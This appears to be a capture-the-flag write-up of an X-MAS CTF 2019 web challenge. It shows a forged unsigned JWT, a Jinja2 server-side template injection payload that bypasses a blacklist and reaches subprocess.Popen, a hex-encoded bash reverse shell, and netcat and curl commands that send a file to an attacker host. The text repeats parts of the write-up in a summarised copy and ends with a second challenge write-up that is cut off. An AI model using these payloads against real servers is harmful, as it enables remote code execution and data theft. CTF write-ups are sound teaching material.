<class 'pkg_resources.extern.packaging.version._BaseVersion'>, 
<class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, 
<class 'pprint._safe_key'>, 
<class 'pprint.PrettyPrinter'>, 
<class 'pkg_resources._vendor.pyparsing._Constants'>, 
<class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, 
<class 'pkg_resources._vendor.pyparsing.ParseResults'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement'>, 
<class 'pkg_resources._vendor.pyparsing._NullToken'>, 
<class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, 
<class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, 
<class 'pkg_resources.extern.packaging.markers.Node'>, 
<class 'pkg_resources.extern.packaging.markers.Marker'>, 
<class 'pkg_resources.extern.packaging.requirements.Requirement'>, 
<class 'pkg_resources.IMetadataProvider'>, 
<class 'pkg_resources.WorkingSet'>, 
<class 'pkg_resources.Environment'>, 
<class 'pkg_resources.ResourceManager'>, 
<class 'pkg_resources.NullProvider'>, 
<class 'pkg_resources.NoDists'>, 
<class 'pkg_resources.EntryPoint'>, 
<class 'pkg_resources.Distribution'>, 
<class 'gunicorn.six._LazyDescr'>, 
<class 'gunicorn.six._SixMetaPathImporter'>, 
<class 'logging.LogRecord'>, 
<class 'logging.PercentStyle'>, 
<class 'logging.Formatter'>, 
<class 'logging.BufferingFormatter'>, 
<class 'logging.Filter'>, 
<class 'logging.Filterer'>, 
<class 'logging.PlaceHolder'>, 
<class 'logging.Manager'>, 
<class 'logging.LoggerAdapter'>, 
<class 'gunicorn.pidfile.Pidfile'>, 
<class 'gunicorn.sock.BaseSocket'>, 
<class 'gunicorn.arbiter.Arbiter'>, 
<class 'gettext.NullTranslations'>, 
<class 'argparse._AttributeHolder'>, 
<class 'argparse.HelpFormatter._Section'>, 
<class 'argparse.HelpFormatter'>, 
<class 'argparse.FileType'>, 
<class 'argparse._ActionsContainer'>, 
<class '_ssl._SSLContext'>, 
<class '_ssl._SSLSocket'>, 
<class '_ssl.MemoryBIO'>, 
<class '_ssl.Session'>, 
<class 'ssl.SSLObject'>, 
<class 'shlex.shlex'>, 
<class 'gunicorn.reloader.InotifyReloader'>, 
<class 'gunicorn.config.Config'>, 
<class 'gunicorn.config.Setting'>, 
<class 'gunicorn.debug.Spew'>, 
<class 'gunicorn.app.base.BaseApplication'>, 
<class 'pickle._Framer'>, 
<class 'pickle._Unframer'>, 
<class 'pickle._Pickler'>, 
<class 'pickle._Unpickler'>, 
<class '_pickle.Unpickler'>, 
<class '_pickle.Pickler'>, 
<class '_pickle.Pdata'>, 
<class '_pickle.PicklerMemoProxy'>, 
<class '_pickle.UnpicklerMemoProxy'>, 
<class '_queue.SimpleQueue'>, 
<class 'queue.Queue'>, 
<class 'queue._PySimpleQueue'>, 
<class 'logging.handlers.QueueListener'>, 
<class 'socketserver.BaseServer'>, 
<class 'socketserver.ForkingMixIn'>, 
<class 'socketserver.ThreadingMixIn'>, 
<class 'socketserver.BaseRequestHandler'>, 
<class 'logging.config.ConvertingMixin'>, 
<class 'logging.config.BaseConfigurator'>, 
<class 'gunicorn.glogging.Logger'>, 
<class 'gunicorn.http.unreader.Unreader'>, 
<class 'gunicorn.http.body.ChunkedReader'>, 
<class 'gunicorn.http.body.LengthReader'>, 
<class 'gunicorn.http.body.EOFReader'>, 
<class 'gunicorn.http.body.Body'>, 
<class 'gunicorn.http.message.Message'>, 
<class 'gunicorn.http.parser.Parser'>, 
<class 'gunicorn.http.wsgi.FileWrapper'>, 
<class 'gunicorn.http.wsgi.Response'>, 
<class 'gunicorn.workers.workertmp.WorkerTmp'>, 
<class 'gunicorn.workers.base.Worker'>, 
<class 'concurrent.futures._base._Waiter'>, 
<class 'concurrent.futures._base._AcquireFutures'>, 
<class 'concurrent.futures._base.Future'>, 
<class 'concurrent.futures._base.Executor'>, 
<class 'asyncio.coroutines.CoroWrapper'>, 
<class 'asyncio.events.Handle'>, 
<class 'asyncio.events.AbstractServer'>, 
<class 'asyncio.events.AbstractEventLoop'>, 
<class 'asyncio.events.AbstractEventLoopPolicy'>, 
<class '_asyncio.Future'>, 
<class '_asyncio.FutureIter'>, 
<class 'TaskStepMethWrapper'>, 
<class 'TaskWakeupMethWrapper'>, 
<class '_RunningLoopHolder'>, 
<class 'asyncio.futures.Future'>, 
<class 'asyncio.protocols.BaseProtocol'>, 
<class 'asyncio.transports.BaseTransport'>, 
<class 'asyncio.sslproto._SSLPipe'>, 
<class 'asyncio.locks._ContextManager'>, 
<class 'asyncio.locks._ContextManagerMixin'>, 
<class 'asyncio.locks.Event'>, 
<class 'asyncio.queues.Queue'>, 
<class 'asyncio.streams.StreamWriter'>, 
<class 'asyncio.streams.StreamReader'>, 
<class 'asyncio.subprocess.Process'>, 
<class 'asyncio.unix_events.AbstractChildWatcher'>, 
<class 'gunicorn.selectors.BaseSelector'>, 
<class 'gunicorn.workers.gthread.TConn'>, 
<class 'concurrent.futures.thread._WorkItem'>, 
<class '_ast.AST'>, 
<class '_json.Scanner'>, 
<class '_json.Encoder'>, 
<class 'json.decoder.JSONDecoder'>, 
<class 'json.encoder.JSONEncoder'>, 
<class 'jinja2.utils.MissingType'>, 
<class 'jinja2.utils.LRUCache'>, 
<class 'jinja2.utils.Cycler'>, 
<class 'jinja2.utils.Joiner'>, 
<class 'jinja2.utils.Namespace'>, 
<class 'markupsafe._MarkupEscapeHelper'>, 
<class 'jinja2.nodes.EvalContext'>, 
<class 'jinja2.nodes.Node'>, 
<class 'jinja2.runtime.TemplateReference'>, 
<class 'jinja2.runtime.Context'>, 
<class 'jinja2.runtime.BlockReference'>, 
<class 'jinja2.runtime.LoopContextBase'>, 
<class 'jinja2.runtime.LoopContextIterator'>, 
<class 'jinja2.runtime.Macro'>, 
<class 'jinja2.runtime.Undefined'>, 
<class 'decimal.Decimal'>, 
<class 'decimal.Context'>, 
<class 'decimal.SignalDictMixin'>, 
<class 'decimal.ContextManager'>, 
<class 'numbers.Number'>, 
<class 'jinja2.lexer.Failure'>, 
<class 'jinja2.lexer.TokenStreamIterator'>, 
<class 'jinja2.lexer.TokenStream'>, 
<class 'jinja2.lexer.Lexer'>, 
<class 'jinja2.parser.Parser'>, 
<class 'jinja2.visitor.NodeVisitor'>, 
<class 'jinja2.idtracking.Symbols'>, 
<class 'jinja2.compiler.MacroRef'>, 
<class 'jinja2.compiler.Frame'>, 
<class 'jinja2.environment.Environment'>, 
<class 'jinja2.environment.Template'>, 
<class 'jinja2.environment.TemplateModule'>, 
<class 'jinja2.environment.TemplateExpression'>, 
<class 'jinja2.environment.TemplateStream'>, 
<class 'jinja2.loaders.BaseLoader'>, 
<class 'jinja2.bccache.Bucket'>, 
<class 'jinja2.bccache.BytecodeCache'>, 
<class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, 
<class 'werkzeug._internal._Missing'>, 
<class 'werkzeug._internal._DictAccessorProperty'>, 
<class 'werkzeug.utils.HTMLBuilder'>, 
<class 'werkzeug.exceptions.Aborter'>, 
<class 'werkzeug.urls.Href'>, 
<class 'email.message.Message'>, 
<class 'http.client.HTTPConnection'>, 
<class 'mimetypes.MimeTypes'>, 
<class 'werkzeug.serving.WSGIRequestHandler'>, 
<class 'werkzeug.serving._SSLContext'>, 
<class 'werkzeug.serving.BaseWSGIServer'>, 
<class 'werkzeug.datastructures.ImmutableListMixin'>, 
<class 'werkzeug.datastructures.ImmutableDictMixin'>, 
<class 'werkzeug.datastructures.UpdateDictMixin'>, 
<class 'werkzeug.datastructures.ViewItems'>, 
<class 'werkzeug.datastructures._omd_bucket'>, 
<class 'werkzeug.datastructures.Headers'>, 
<class 'werkzeug.datastructures.ImmutableHeadersMixin'>, 
<class 'werkzeug.datastructures.IfRange'>, 
<class 'werkzeug.datastructures.Range'>, 
<class 'werkzeug.datastructures.ContentRange'>, 
<class 'werkzeug.datastructures.FileStorage'>, 
<class 'urllib.request.Request'>, 
<class 'urllib.request.OpenerDirector'>, 
<class 'urllib.request.BaseHandler'>, 
<class 'urllib.request.HTTPPasswordMgr'>, 
<class 'urllib.request.AbstractBasicAuthHandler'>, 
<class 'urllib.request.AbstractDigestAuthHandler'>, 
<class 'urllib.request.URLopener'>, 
<class 'urllib.request.ftpwrapper'>, 
<class 'werkzeug.wrappers.accept.AcceptMixin'>, 
<class 'werkzeug.wrappers.auth.AuthorizationMixin'>, 
<class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, 
<class 'werkzeug.wsgi.ClosingIterator'>, 
<class 'werkzeug.wsgi.FileWrapper'>, 
<class 'werkzeug.wsgi._RangeWrapper'>, 
<class 'werkzeug.formparser.FormDataParser'>, 
<class 'werkzeug.formparser.MultiPartParser'>, 
<class 'werkzeug.wrappers.base_request.BaseRequest'>, 
<class 'werkzeug.wrappers.base_response.BaseResponse'>, 
<class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, 
<class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, 
<class 'werkzeug.wrappers.etag.ETagRequestMixin'>, 
<class 'werkzeug.wrappers.etag.ETagResponseMixin'>, 
<class 'werkzeug.useragents.UserAgentParser'>, 
<class 'werkzeug.useragents.UserAgent'>, 
<class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, 
<class 'werkzeug.wrappers.request.StreamOnlyMixin'>, 
<class 'werkzeug.wrappers.response.ResponseStream'>, 
<class 'werkzeug.wrappers.response.ResponseStreamMixin'>, 
<class 'http.cookiejar.Cookie'>, 
<class 'http.cookiejar.CookiePolicy'>, 
<class 'http.cookiejar.Absent'>, 
<class 'http.cookiejar.CookieJar'>, 
<class 'werkzeug.test._TestCookieHeaders'>, 
<class 'werkzeug.test._TestCookieResponse'>, 
<class 'werkzeug.test.EnvironBuilder'>, 
<class 'werkzeug.test.Client'>, 
<class 'uuid.UUID'>, 
<class 'itsdangerous._json._CompactJSON'>, 
<class 'hmac.HMAC'>, 
<class 'itsdangerous.signer.SigningAlgorithm'>, 
<class 'itsdangerous.signer.Signer'>, 
<class 'itsdangerous.serializer.Serializer'>, 
<class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, 
<class 'flask._compat._DeprecatedBool'>, 
<class 'greenlet.greenlet'>, 
<class 'werkzeug.local.Local'>, 
<class 'werkzeug.local.LocalStack'>, 
<class 'werkzeug.local.LocalManager'>, 
<class 'werkzeug.local.LocalProxy'>, 
<class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, 
<class 'dataclasses._MISSING_TYPE'>, 
<class 'dataclasses._FIELD_BASE'>, 
<class 'dataclasses.InitVar'>, 
<class 'dataclasses.Field'>, 
<class 'dataclasses._DataclassParams'>, 
<class 'ast.NodeVisitor'>, 
<class 'difflib.SequenceMatcher'>, 
<class 'difflib.Differ'>, 
<class 'difflib.HtmlDiff'>, 
<class 'werkzeug.routing.RuleFactory'>, 
<class 'werkzeug.routing.RuleTemplate'>, 
<class 'werkzeug.routing.BaseConverter'>, 
<class 'werkzeug.routing.Map'>, 
<class 'werkzeug.routing.MapAdapter'>, 
<class 'click._compat._FixupStream'>, 
<class 'click._compat._AtomicFile'>, 
<class 'click.utils.LazyFile'>, 
<class 'click.utils.KeepOpenFile'>, 
<class 'click.utils.PacifyFlushWrapper'>, 
<class 'click.types.ParamType'>, 
<class 'click.parser.Option'>, 
<class 'click.parser.Argument'>, 
<class 'click.parser.ParsingState'>, 
<class 'click.parser.OptionParser'>, 
<class 'click.formatting.HelpFormatter'>, 
<class 'click.core.Context'>, 
<class 'click.core.BaseCommand'>, 
<class 'click.core.Parameter'>, 
<class 'flask.signals.Namespace'>, 
<class 'flask.signals._FakeSignal'>, 
<class 'flask.helpers.locked_cached_property'>, 
<class 'flask.helpers._PackageBoundObject'>, 
<class 'flask.cli.DispatchingApp'>, 
<class 'flask.cli.ScriptInfo'>, 
<class 'flask.config.ConfigAttribute'>, 
<class 'flask.ctx._AppCtxGlobals'>, 
<class 'flask.ctx.AppContext'>, 
<class 'flask.ctx.RequestContext'>, 
<class 'flask.json.tag.JSONTag'>, 
<class 'flask.json.tag.TaggedJSONSerializer'>, 
<class 'flask.sessions.SessionInterface'>, 
<class 'werkzeug.wrappers.json._JSONModule'>, 
<class 'werkzeug.wrappers.json.JSONMixin'>, 
<class 'flask.blueprints.BlueprintSetupState'>, 
<class 'typing._Final'>, 
<class 'typing._Immutable'>, 
<class 'typing.Generic'>, 
<class 'typing._TypingEmpty'>, 
<class 'typing._TypingEllipsis'>, 
<class 'typing.NamedTuple'>, 
<class 'typing.io'>, 
<class 'typing.re'>, 
<class 'six._LazyDescr'>, 
<class 'six._SixMetaPathImporter'>, 
<class 'cryptography.hazmat.primitives.asymmetric.AsymmetricSignatureContext'>, 
<class 'cryptography.hazmat.primitives.asymmetric.AsymmetricVerificationContext'>, 
<class 'unicodedata.UCD'>, 
<class 'asn1crypto.util.extended_date'>, 
<class 'asn1crypto.util.extended_datetime'>, 
<class 'CArgObject'>, 
<class '_ctypes.CThunkObject'>, 
<class '_ctypes._CData'>, 
<class '_ctypes.CField'>, 
<class '_ctypes.DictRemover'>, 
<class 'ctypes.CDLL'>, 
<class 'ctypes.LibraryLoader'>, 
<class 'asn1crypto.core.Asn1Value'>, 
<class 'asn1crypto.core.ValueMap'>, 
<class 'asn1crypto.core.Castable'>, 
<class 'asn1crypto.core.Constructable'>, 
<class 'asn1crypto.core.Concat'>, 
<class 'asn1crypto.core.BitString'>, 
<class 'asn1crypto.algos._ForceNullParameters'>, 
<class 'cryptography.utils._DeprecatedValue'>, 
<class 'cryptography.utils._ModuleWithDeprecations'>, 
<class 'cryptography.hazmat.backends.interfaces.CipherBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.HashBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.HMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.CMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.PBKDF2HMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.RSABackend'>, 
<class 'cryptography.hazmat.backends.interfaces.DSABackend'>, 
<class 'cryptography.hazmat.backends.interfaces.EllipticCurveBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.PEMSerializationBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.DERSerializationBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.X509Backend'>, 
<class 'cryptography.hazmat.backends.interfaces.DHBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.ScryptBackend'>, 
<class 'cryptography.hazmat.primitives.hashes.HashAlgorithm'>, 
<class 'cryptography.hazmat.primitives.hashes.HashContext'>, 
<class 'cryptography.hazmat.primitives.hashes.ExtendableOutputFunction'>, 
<class 'cryptography.hazmat.primitives.hashes.Hash'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA1'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512_224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512_256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA384'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_384'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_512'>, 
<class 'cryptography.hazmat.primitives.hashes.SHAKE128'>, 
<class 'cryptography.hazmat.primitives.hashes.SHAKE256'>, 
<class 'cryptography.hazmat.primitives.hashes.MD5'>, 
<class 'cryptography.hazmat.primitives.hashes.BLAKE2b'>, 
<class 'cryptography.hazmat.primitives.hashes.BLAKE2s'>, 
<class 'cryptography.hazmat.primitives.asymmetric.utils.Prehashed'>, 
<class 'cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption'>, 
<class 'cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption'>, 
<class 'cryptography.hazmat.primitives.serialization.base.NoEncryption'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers'>, 
<class 'cryptography.hazmat._oid.ObjectIdentifier'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163R2'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP521R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP384R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP224R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP192R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.ECDSA'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.ECDH'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.PSS'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.OAEP'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.MGF1'>, 
<class 'jwt.algorithms.Algorithm'>, 
<class 'jwt.api_jws.PyJWS'>, 
<class 'jinja2.ext.Extension'>, 
<class 'jinja2.ext._CommentFinder'>, 
<class 'jinja2.debug.TracebackFrameProxy'>, 
<class 'jinja2.debug.ProcessedTraceback'>]
```

You can use the `__dir__()` method to enumerate all the methods that can be called from this result.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fdir\x5f\x5f')()}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 10:00:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1385
Connection: close

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/login"">Login</a>
	<a href=""/register"">Register</a>

</div>
	<div class=""container"" style=""text-align:center"">
		<img class=""hat"" src=""/static/img/hats/7.png"">
		<h1>You are viewing:<br><span style=""color:#FFA144;"">[&#39;__repr__&#39;, &#39;__hash__&#39;, &#39;__getattribute__&#39;, &#39;__lt__&#39;, &#39;__le__&#39;, &#39;__eq__&#39;, &#39;__ne__&#39;, &#39;__gt__&#39;, &#39;__ge__&#39;, &#39;__iter__&#39;, &#39;__init__&#39;, &#39;__len__&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;, &#39;__delitem__&#39;, &#39;__add__&#39;, &#39;__mul__&#39;, &#39;__rmul__&#39;, &#39;__contains__&#39;, &#39;__iadd__&#39;, &#39;__imul__&#39;, &#39;__new__&#39;, &#39;__reversed__&#39;, &#39;__sizeof__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;append&#39;, &#39;insert&#39;, &#39;extend&#39;, &#39;pop&#39;, &#39;remove&#39;, &#39;index&#39;, &#39;count&#39;, &#39;reverse&#39;, &#39;sort&#39;, &#39;__doc__&#39;, &#39;__str__&#39;, &#39;__setattr__&#39;, &#39;__delattr__&#39;, &#39;__reduce_ex__&#39;, &#39;__reduce__&#39;, &#39;__subclasshook__&#39;, &#39;__init_subclass__&#39;, &#39;__format__&#39;, &#39;__dir__&#39;, &#39;__class__&#39;]</span></h1>
	</div>
</body>

<script src=""/static/js/snow.js""></script>
```

There is an interesting `__getitem__()` method that can be used to retrieve the data from the list using the index but without using `[]`.

The `<class 'subprocess.Popen'>` class is at position number `215` and allow us to launch commands.

We can setup a server listening on port `1337` with `nc -lk 1337` and then encode a reverse shell that will be launched on the victim host in order to connect to our server.

```
/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/1337 0>&1""

\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22
```

The request will be the following.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(215)('\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22',shell=True)}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

On the victim host an interesting file can be found: `unusual_flag.mp4`. It can be transferred like the following:
* on the attacker machine: `nc -l -p 8000 > unusual_flag.mp4`;
* on the victim machine: `curl -X POST --data-binary @unusual_flag.mp4 http://x.x.x.x:8000`.

At this point you have to remove the HTTP headers inserted into the created file by `nc` and then you can launch the MP4 video [unusual_flag.mp4](unusual_flag.mp4).

Into the video there is the flag.

```
X-MAS{W3lc0m3_70_7h3_h4t_f4ct0ry__w3ve_g0t_unusu4l_h4ts_90d81c091da}
```","Registering a user and analyzing cookies you will find a cookie called `auth` containing a JWT.

You can check its creation inside `register` and `login` methods of the source code.

Analyzing the source code you can discover two interesting endpoints.

Considering the presence of template rendering operations into `/makehat` endpoint with a parameter read from the user, probably that functionality is vulnerable to Server Side Template Injection (SSTI) due to the insecure usage of Flask/Jinja2 template engine.

The first check to bypass for the `/authorize` endpoint is the following.

[Python code that checks whether the value associated with the key ""type"" in the dictionary ""userData"" is not equal to the string ""admin"", and if so, returns an error message using the Flask template ""error.html"".]

This can be easily bypassed forging a JWT like the following and testing that you are an admin connecting to the root of the website.

Checking it to the index endpoint.

At this point you have to break this check.

[Python code snippet that checks whether a form field ""accessCode"" matches a combination of user-specific values concatenated together, and if it does, grants the user access to administrative privileges by setting the corresponding key in the ""authorizedAdmin"" dictionary to True.]

Analyzing the code you will understand that variables are populated from Santa's data, that data is well known except its secret.

At this point I was stuck and I was not able to bypass this check, so I did something (stupid, lol) that led me to what I think was an **unintended solution** to bypass the check: I registered a user with username `Santa`.

The user with username `Santa` was already into `adminPrivileges`, so I only crafted the correct JWT to bypass the previous check and I added the `pass` field needed by the `/makehat` endpoint.

Here the request to the endpoint.

[HTTP request sent to a server requesting the resource ""/makehat"" with the parameter ""hatName=test"", along with various headers including the user agent, accept encoding, and cookies. The server responds with an HTTP 200 OK status code and sends back a webpage containing HTML, CSS, and JavaScript.]

Trying the auth token to the homepage will confirm our privileges.

Trying the `{{7*7}}` payload to the `/makehat` endpoint will reveal a SSTI vulnerability.

Usually, something like the following can be used to access classes loaded into the server and to invoke them.

[A Python code snippet that uses class manipulation to execute code that reads the contents of the file ""/etc/passwd""]

But we have some restrictions, as you can see in the following blacklist used into `/makehat` endpoint.

[A Python list named ""blacklist"" containing strings that are presumably restricted keywords or characters in a particular context.]

So we have to use some tricks like the hexadecimal encoding of the strings and the `attr` filter of Jinja2.

An HTTP GET request can be used to enumerate all classes.

You can use the `__dir__()` method to enumerate all the methods that can be called from this result.

There is an interesting `__getitem__()` method that can be used to retrieve the data from the list using the index but without using `[]`.

The `<class 'subprocess.Popen'>` class is at position number `215` and allow us to launch commands.

We can setup a server listening on port `1337` with `nc -lk 1337` and then encode a reverse shell that will be launched on the victim host in order to connect to our server.

On the victim host an interesting file can be found: `unusual_flag.mp4`.

At this point you have to remove the HTTP headers inserted into the created file by `nc` and then you can launch the MP4 video.

Into the video there is the flag."
"# X-MAS CTF 2019 – Rigged Election

* **Category:** web
* **Points:** 50

## Challenge

> Come one, come all! We've opened up a brand new website that allows the Lapland people to vote the next big town hall project! Just upload your ideas on the platform and vote using your CPU power. We've made sure voting takes a great amount of effort, so there's no easy way to play the system.
> 
> If you are indeed able to vote more than 250 times, you will be congratulated as an active Lapland citizen and receive a prize worthy of this title.
> 
> Remote server: http://challs.xmas.htsp.ro:11001
>
> Author: Milkdrop
>
> Note: The ideas you post are public and logged, posting any X-MAS flags may > disqualify your team
>
> Note 2: You must send all 250 votes from the same PHP session, otherwise the server will not be able to send you the flag.

## Solution

With the website you can submit an idea. An ID is assigned to that idea and the idea can be voted.

Here the HTML source.

```html
<head>
	<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
</head>

<body>
	<div class=""container"">
		<div id=""status"" class=""status invisible""></div>

		<img src=""/img/idea.gif"">
		<h1 class=""head""> Idea Voting System </h1>
		<img src=""/img/idea.gif"">

		<h2><i>Submit your idea:</i></h2>
		<form style=""padding-left: 35px"" action=""/"" name=""newIdea"" method=""post"">
			<textarea maxlength=""31"" style=""margin-right: 45px; margin-bottom: 5px; height: 25px"" placeholder=""Name"" cols=""30"" rows =""1"" name=""name""></textarea><br>
			<textarea maxlength=""255"" placeholder=""I think that we should do X, because Y ..."" cols=""30"" rows =""5"" name=""idea""></textarea>
			<input class=""submitButton"" type=""submit"" value="""">
		</form>

		<div class=""idea special""><b class=""name"">name</b> / 123456 Points<div class=""vote"">
						<div class=""agree"" onclick=""vote(16773, 1)"">(I agree)</div> / 
						<div class=""disagree"" onclick=""vote(16773, 0)"">(I disagree)</div>
